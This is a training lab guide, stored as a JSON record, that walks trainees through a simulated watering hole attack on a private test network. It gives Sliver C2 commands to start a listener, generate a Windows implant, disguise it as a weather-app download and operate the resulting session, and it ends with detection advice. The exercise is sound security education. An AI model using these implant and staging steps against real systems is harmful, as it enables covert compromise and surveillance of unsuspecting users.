{
  "title": "Watering Hole Attack - Client Exploitation Training",
  "content_type": "student_guide",
  "body_markdown": "# Watering Hole Attack - Client Exploitation Training\n\n## Objective\nUnderstand how attackers use watering hole attacks to compromise corporate endpoints through trojanized applications hosted on trusted-looking websites.\n\n## Scenario Overview\nYou are an IT security trainee observing a simulated watering hole attack. A threat actor has compromised a weather forecast website and embedded a trojanized desktop application (\"AtmosVision Pro\") that delivers a Sliver C2 implant when downloaded and executed.\n\n## Network Diagram\n```\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   USER SPACE     \u2502     \u2502       DMZ         \u2502     \u2502   BLUE SPACE     \u2502\n\u2502  10.100.0.0/24   \u2502\u2500\u2500\u2500\u2500\u25b6\u2502  10.100.1.0/24    \u2502\u25c0\u2500\u2500\u2500\u2500\u2502  10.100.2.0/24   \u2502\n\u2502                  \u2502     \u2502                   \u2502     \u2502                  \u2502\n\u2502  victim-ws       \u2502     \u2502  sliver-weather   \u2502     \u2502  c2-operator     \u2502\n\u2502  10.100.0.10     \u2502     \u2502  .1.10 / .2.10    \u2502     \u2502  10.100.2.20     \u2502\n\u2502  (Windows 11)    \u2502     \u2502  (Listening Post) \u2502     \u2502  (Ubuntu Desktop) \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n```\n\n## VMs\n| VM | IP | Role |\n|----|-----|------|\n| victim-ws | 10.100.0.10 | Windows 11 victim workstation |\n| sliver-weather | 10.100.1.10 (DMZ) / 10.100.2.10 (Blue) | Watering hole + C2 listener |\n| c2-operator | 10.100.2.20 | C2 operator console |\n\n## Exercise Steps\n\n### Step 1: Verify Environment\n- Open VNC console to each VM\n- From c2-operator, ping 10.100.2.10 to verify blue-space connectivity\n- From victim-ws, open browser and go to http://10.100.1.10\n\n### Step 2: Configure C2 (Operator)\n1. On c2-operator, open a terminal\n2. Import the operator config:\n   ```bash\n   sliver import /path/to/operator_config.cfg\n   ```\n3. Connect to Sliver:\n   ```bash\n   sliver\n   ```\n4. Start the mTLS listener:\n   ```\n   mtls --lhost 10.100.1.10 --lport 31337\n   ```\n5. Generate a Windows implant:\n   ```\n   generate --mtls 10.100.1.10:31337 --os windows --arch amd64 --save /tmp/implant.exe\n   ```\n\n### Step 3: Stage the Implant\n- Copy the implant to the sliver-weather server's download endpoint\n- The weather site's \"AtmosVision Pro\" link will serve this file\n\n### Step 4: Execute the Attack\n1. On victim-ws, browse to http://10.100.1.10\n2. Click the download link for \"AtmosVision Pro\"\n3. Run the downloaded installer\n4. Observe: the weather app appears to install normally\n\n### Step 5: Observe C2 Session\n1. On c2-operator, watch the Sliver console\n2. A new session should appear from 10.100.0.10\n3. Interact with the session:\n   ```\n   sessions\n   use <session-id>\n   whoami\n   info\n   ls C:\\\\Users\\\\Trainee\\\\Desktop\n   screenshot\n   ```\n\n### Step 6: Discussion\n- **What happened?** The user visited a legitimate-looking website and downloaded what appeared to be a normal application. The installer contained a hidden implant that established a reverse connection to the attacker's infrastructure.\n- **Why is this effective?** Watering hole attacks exploit trust in familiar websites. Users are less suspicious of downloads from sites they regularly visit.\n- **How to detect?**\n  - Application whitelisting / allowlisting\n  - EDR behavioral detection\n  - Network monitoring for unusual outbound connections\n  - DNS filtering and web proxies\n  - Code signing verification\n  - Sandboxed browser environments\n  - User security awareness training\n\n## Key Takeaways\n1. Legitimate-looking websites can be weaponized\n2. Downloaded applications should always be verified (hash, signature)\n3. Network monitoring can detect C2 callbacks\n4. Defense in depth is essential - no single control prevents this attack\n5. User awareness is the first line of defense\n"
}
